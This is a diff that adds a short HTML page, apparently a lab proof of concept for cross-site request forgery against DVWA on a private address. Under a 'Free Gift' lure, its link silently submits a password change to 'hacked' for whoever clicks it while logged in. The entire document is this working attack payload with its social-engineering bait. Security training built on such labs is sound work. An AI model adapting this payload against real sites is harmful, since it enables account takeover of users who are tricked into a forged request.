@@ -1,0 +1,8 @@
+<html>
+  <body>
+    <h1>Click Here for a Free Gift!</h1>
+    <a href="http://192.168.100.12/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
+      Click Here to Claim Your Prize!
+    </a>
+  </body>
+</html>
